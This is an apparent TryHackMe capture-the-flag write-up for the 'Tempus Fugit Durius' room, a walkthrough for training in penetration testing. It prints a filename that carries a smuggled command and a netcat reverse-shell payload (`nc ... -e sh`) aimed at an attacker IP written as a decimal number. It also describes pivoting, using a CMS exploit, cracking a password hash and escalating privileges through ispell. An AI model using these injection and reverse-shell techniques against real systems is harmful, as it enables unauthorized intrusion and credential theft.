# Tempus Fugit Durius

https://tryhackme.com/room/tempusfugitdurius

Rated HARD

Bit of a tricky room, with multiple stages.

1. A site is exposed on port 80, with a upload function. The file name is vulnerable to limited RCE (e.g. use burp to change file name to `t.txt;ls -la`) which if nothing goes wrong will feed the response into the message on the following page. With this limited recon can be performed, including reading the sites code.

2. This reveals a limit of 30 characters, and the presence of .txt or .rtf somewhere in the name. This can be abused to establish a netcat connection, e.g. with `t.txt;nc 168462808 44 -e sh`. Note that the ip address of the attack box is converted to its decimal representation (which still works) to reduce character count.

3. On the machine, its obviously a docker container with limited access. However, in /etc/resolv.conf there is an entry for 'mofo.pwn'. This is also referenced in the site folder, where files you upload are sent to 'ftp.mofo.pwn'. Dig is on the machine, and via that you can run `dig axfr mofo.pwn` to get a set of IP addresses.

4. Of these, the ftp IP address is useful (192.168.150.12) and the IP address for a CMS (192.168.150.1). By establishing a proxy forward through this docker container (via chisel, meterpreter, reverse_ssh or whatever) the website on .1 is the Batflat CMS, which has a known authenticated exploit here: https://www.exploit-db.com/exploits/49573

5. The FTP server can either be accessed from the box using the python ftp library, or via the attack box with proxychains. If doing the latter, after connecting to the server (using the credentials from the website code), use the `passive` command to get around the bind port not work over a proxy. On the ftp server is a creds.txt file that contains the admin creds for the batflat CMS instance.

6. With these creds and teh exploit from 4, you can get a reverse shell on the final machine.

At this point its quickest to go straight to root, but if one chooses its also possible to get the user flag first by switching from www-data to the benclover user. This is done by getting the password out of the sqlite database.sdb file the CMS is using, and bruteforcing the hash (-m 3200) with hashcat. This reveals ben's password and you can su to that user.

To privesc to root is possible from benclover OR the www-data user, and involves the SGUID binary on the machine `ispell`, a spellchecker. https://gtfobins.github.io/gtfobins/ispell/ shows how to escape ispell, but you will only have the `adm` group privileges. However, this is enough to access `/var/log/auth.log`, which contains within it a mistype event involving a password string. This is the password for the root account.
